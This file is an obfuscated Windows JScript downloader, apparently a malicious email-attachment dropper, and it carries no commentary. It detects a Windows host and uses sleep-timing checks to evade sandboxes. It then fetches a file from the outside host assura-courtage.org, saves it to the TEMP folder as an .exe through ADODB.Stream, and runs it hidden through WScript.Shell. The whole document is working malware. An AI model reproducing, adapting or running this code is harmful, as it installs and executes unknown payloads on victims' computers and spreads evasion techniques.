var _F = false;
var _X = "CreateObject";
var _VX = function _QD() {return WScript[_X]("WScript"+".Shell");}(), _FJ = 11;
var _M = "MSXML2.XMLHTTP";
var _UE = 2123213;
var _L = 0;
function _T(_G){_VX["Run"](_G, _L, _L);};
function _W(){return _M + "";};
function _K0(_K1, _F0){_L = _L * 1; return _K1 - _F0;};
function _N(){return _X;};
/*@cc_on
  @if (@_win32 || @_win64)
    _F = true;
  @end
@*/
if (_F)
{
var _U = "";
function _S(){return 22;};
var _G0 = 0; var _C0 = 0;
function _CZ()
{
var _C = new this["Date"]();
var _ZZ = _C["getUTCMilliseconds"]();
WScript["Sleep"](_S());
var _C = new this["Date"]();
var _RH = _C["getUTCMilliseconds"]();
WScript["Sleep"](_S());
var _C = new this["Date"]();
var _PE = _C["getUTCMilliseconds"]();
var _G0 = "_XN";
_G0 = _K0(_RH, _ZZ);
var _C0 = "_N0";
_C0 = _K0(_PE, _RH);
_U = "open";
return _K0(_G0, _C0);
}
var _SW = false;
var _HT = false;
for (var _AW = _L; _AW < _S() * 1; _AW++){if (_CZ() != _L){
_SW = true; 
_C0 = "31" + 11 * _G0 + _C0; 
_HT = true; 
break;
}}
function _IC() {return ((_SW == true) && (_SW == _HT)) ? 1 : _L;};
if (_SW && _IC() && _HT){
function _MA() {return _VX["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "nLrvM6U0.ex" + "e";};
 _BS = _W();
 _QY = WScript[_X](_BS);
 var _DM = 1;
 while (_DM){
try {
	if (_DM == 1)
	{
		_QY[_U]("GET", "http://assura-courtage.org/j2osla", false);
		_QY["send"]();
		_AE = "Sleep";
	}
	WScript[_AE](_S() + 120); 
	if (_QY["readystate"] < 2 * 2) continue;
	_DM = _L;
	function _K(_TU) {var _MB = (1, 2, 3, 4, 5, _TU); return _MB;};
	_VE = WScript[_N()]("ADODB.Stream");
	_BS = _VE;
	_BS[_U]();
	_BS["type"] = _K(1);
	_BS["write"](_QY["ResponseBody"]);
	_VE["position"] = _K(_L);
	_BS["Save" + "ToFile"](_MA(), 2);
	_VE["cl"+"ose"]();
	_UY = _MA();
	_T(_UY);
} catch(_XI){};
}
}
}

